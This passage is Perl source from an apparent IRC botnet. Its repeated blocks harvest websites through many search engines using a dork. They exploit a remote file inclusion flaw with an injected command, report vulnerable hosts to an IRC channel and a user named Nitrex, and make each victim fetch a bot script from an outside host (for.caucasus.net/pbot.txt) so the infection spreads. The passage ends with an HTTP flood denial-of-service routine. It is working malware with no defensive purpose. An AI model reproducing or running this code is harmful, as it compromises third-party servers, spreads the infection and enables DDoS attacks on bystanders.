$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe OFF] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
  sendraw($IRC_cur_socket, "PRIVMSG Nitrex :Uname:6 $type Vuln:10 $print");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
my $ding="http://".$sito.$bug."http://for.caucasus.net/pbot.txt?";
my $dong=HTTP::Request->new(GET=>$ding);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($dong);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe ON] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
my $test2="http://".$sito.$bug.$spreads."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### Yahoo
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @ylist=&yahoo($dork);
	my @yalist=&yahooa($dork);
	my @yblist=&yahoob($dork);
	my @yclist=&yahooc($dork);
	my @ydlist=&yahood($dork);
		push(my @yahoobypass, @ylist, @yalist, @yblist, @yclist, @ydlist );	
#
push(my @tot, @yahoobypass);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[+]6 ".scalar(@tot)." 4-6 ".scalar(@puliti)." 4-6 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
sendraw($IRC_cur_socket, "PRIVMSG $printl :5[~]6 ".$contatore." 4-6 ".$uni." "); 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[F]4 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe OFF] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
  sendraw($IRC_cur_socket, "PRIVMSG Nitrex :Uname:6 $type Vuln:10 $print");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
my $ding="http://".$sito.$bug."http://for.caucasus.net/pbot.txt?";
my $dong=HTTP::Request->new(GET=>$ding);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($dong);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe ON] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
my $test2="http://".$sito.$bug.$spreads."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### MSN
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @mlist=&msn($dork);
push(my @tot, @mlist);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[+]6 ".scalar(@tot)." 4-6 ".scalar(@puliti)." 4-6 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
sendraw($IRC_cur_socket, "PRIVMSG $printl :5[~]6 ".$contatore." 4-6 ".$uni." "); 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[F]4 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe OFF] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all)] $type EXPLOITING:4 $print ");
  sendraw($IRC_cur_socket, "PRIVMSG Nitrex :Uname:6 $type Vuln:10 $print");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
my $ding="http://".$sito.$bug."http://for.caucasus.net/pbot.txt?";
my $dong=HTTP::Request->new(GET=>$ding);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($dong);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe ON] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
my $test2="http://".$sito.$bug.$spreads."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### SEARCH
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @slist=&search($dork);
push(my @tot, @slist);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[+]6 ".scalar(@tot)." 4-6 ".scalar(@puliti)." 4-6 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
sendraw($IRC_cur_socket, "PRIVMSG $printl :5[~]6 ".$contatore." 4-6 ".$uni." "); 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[F]4 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe OFF] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
  sendraw($IRC_cur_socket, "PRIVMSG Nitrex :Uname:6 $type Vuln:10 $print");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
my $ding="http://".$sito.$bug."http://for.caucasus.net/pbot.txt?";
my $dong=HTTP::Request->new(GET=>$ding);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($dong);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe ON] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
my $test2="http://".$sito.$bug.$spreads."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### FireBall
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @fireball=fireball($dork);
push(my @tot, @fireball);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[+]6 ".scalar(@tot)." - ".scalar(@puliti)." - $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
sendraw($IRC_cur_socket, "PRIVMSG $printl :5[*]6 ".$contatore." - ".$uni." "); 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[F]6 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe OFF] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
  sendraw($IRC_cur_socket, "PRIVMSG Nitrex :Uname:6 $type Vuln:10 $print");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
my $ding="http://".$sito.$bug."http://for.caucasus.net/pbot.txt?";
my $dong=HTTP::Request->new(GET=>$ding);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($dong);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe ON] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
my $test2="http://".$sito.$bug.$spreads."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### UOL
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @ulist=&uol($dork);
push(my @tot, @ulist);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[+]6 ".scalar(@tot)." 4-6 ".scalar(@puliti)." 4-6 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
sendraw($IRC_cur_socket, "PRIVMSG $printl :5[~]6 ".$contatore." 4-6 ".$uni.""); 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[F]4 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe OFF] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
  sendraw($IRC_cur_socket, "PRIVMSG Nitrex :Uname:6 $type Vuln:10 $print");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
my $ding="http://".$sito.$bug."http://for.caucasus.net/pbot.txt?";
my $dong=HTTP::Request->new(GET=>$ding);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($dong);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe ON] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
my $test2="http://".$sito.$bug.$spreads."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### ALTAVISTA
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @alist=&altavista($dork);
	my @ablist=&altavistade($dork);
	my @aclist=&altavistaus($dork);
push(my @tot, @alist,@ablist,@aclist);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[+]6 ".scalar(@tot)." 4-6 ".scalar(@puliti)." 4-6 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
sendraw($IRC_cur_socket, "PRIVMSG $printl :5[~]6 ".$contatore." 4-6 ".$uni.""); 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[F]4 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[Safe OFF] 6 Uname:13 $type 5 EXP:4 $print ");
  sendraw($IRC_cur_socket, "PRIVMSG Nitrex :Uname:6 $type Vuln:10 $print");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
my $ding="http://".$sito.$bug."http://for.caucasus.net/pbot.txt?";
my $dong=HTTP::Request->new(GET=>$ding);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($dong);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[Safe ON] 6 Uname:13 $type 5 EXP:4 $print ");
my $test2="http://".$sito.$bug.$spreads."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### HOTBOT
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @hlist=&hotbot($dork);
	my @hlistb=&hotbotb($dork);
push(my @tot, @hlist, @hlistb);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[+]6 ".scalar(@tot)." 4-6 ".scalar(@puliti)." 4-6 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
sendraw($IRC_cur_socket, "PRIVMSG $printl :5[~]6 ".$contatore." 4-6 ".$uni." "); 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[F]4 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe OFF] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
  sendraw($IRC_cur_socket, "PRIVMSG Nitrex :Uname:6 $type Vuln:10 $print");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
my $ding="http://".$sito.$bug."http://for.caucasus.net/pbot.txt?";
my $dong=HTTP::Request->new(GET=>$ding);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($dong);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe ON] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
my $test2="http://".$sito.$bug.$spreads."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### MAMMA
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @malist=&mamma($dork);
push(my @tot, @malist);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[+]6 ".scalar(@tot)." 4-6 ".scalar(@puliti)." 4-6 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
sendraw($IRC_cur_socket, "PRIVMSG $printl :5[~]6 ".$contatore." 4-6 ".$uni." "); 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[F]4 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe OFF] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
  sendraw($IRC_cur_socket, "PRIVMSG Nitrex :Uname:6 $type Vuln:10 $print");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
my $ding="http://".$sito.$bug."http://for.caucasus.net/pbot.txt?";
my $dong=HTTP::Request->new(GET=>$ding);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($dong);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe ON] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
my $test2="http://".$sito.$bug.$spreads."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### MOZBOT
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @mozlist=&mozbot($dork);
	my @mozlista=&mozbota($dork);
        my @mozlistb=&mozbotb($dork);
push(my @tot, @mozlist, @mozlista, @mozlistb);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[+]6 ".scalar(@tot)." 4-6 ".scalar(@puliti)." 4-6 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
sendraw($IRC_cur_socket, "PRIVMSG $printl :5[~]6 ".$contatore." 4-6 ".$uni." "); 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[F]4 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe OFF] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
  sendraw($IRC_cur_socket, "PRIVMSG Nitrex :Uname:6 $type Vuln:10 $print");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
my $ding="http://".$sito.$bug."http://for.caucasus.net/pbot.txt?";
my $dong=HTTP::Request->new(GET=>$ding);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($dong);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe ON] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
my $test2="http://".$sito.$bug.$spreads."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### AOL
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @aollist=&aol($dork);
	my @aollista=&aola($dork);
	my @aollistb=&aolb($dork);
	my @aollistc=&aolc($dork);
push(my @aolbyp,@aollist, @aollista, @aollistb, @aollistc );
push(my @tot, @aolbyp);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[+]6 ".scalar(@tot)." 4-6 ".scalar(@puliti)." 4-6 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
sendraw($IRC_cur_socket, "PRIVMSG $printl :5[~]6 ".$contatore." 4-6 ".$uni." "); 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[F]4 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe OFF] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
  sendraw($IRC_cur_socket, "PRIVMSG Nitrex :Uname:6 $type Vuln:10 $print");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
my $ding="http://".$sito.$bug."http://for.caucasus.net/pbot.txt?";
my $dong=HTTP::Request->new(GET=>$ding);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($dong);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe ON] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
my $test2="http://".$sito.$bug.$spreads."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################################################################
#################### ASK
######################################################################
if ($funcarg =~ /^scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
# Starting The Search Engine
	my @asklist=&ask($dork);
	my @asklista=&aska($dork);
	my @asklistb=&askb($dork);
push(my @tot, @asklist, @asklista, @asklistb);
my @puliti=&unici(@tot);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[+]6 ".scalar(@tot)." 4-6 ".scalar(@puliti)." 4-6 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){
sendraw($IRC_cur_socket, "PRIVMSG $printl :5[~]6 ".$contatore." 4-6 ".$uni." "); 
}
if ($contatore==$uni-1){
  sendraw($IRC_cur_socket, "PRIVMSG $printl :5[F]4 $dork");
}
### Print CMD and TEST CMD###
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
### End of Print CMD and TEST CMD###
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe OFF] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
  sendraw($IRC_cur_socket, "PRIVMSG Nitrex :Uname:6 $type Vuln:10 $print");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
my $ding="http://".$sito.$bug."http://for.caucasus.net/pbot.txt?";
my $dong=HTTP::Request->new(GET=>$ding);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($dong);
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4[Safe ON] 5 [Uname: $un] [HDD: Free ($free) Used ($used) Total ($all) $type EXPLOITING:4 $print ");
my $test2="http://".$sito.$bug.$spreads."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################
# Love Is The Best Way Of Suicide
#	
#                                                               
# cLassic RosE
######################
#     HTTPFlood      # 
#                    #
######################
if ($funcarg =~ /^httpflood\s+(.*)\s+(\d+)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :13Http DDoS13� Flooder loaded 12 ".$1." on port 80 for 12 ".$2." seconds .");
my $itime = time;
my ($cur_time);
$cur_time = time - $itime;
while ($2>$cur_time){
$cur_time = time - $itime;
my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
close($socket);
}
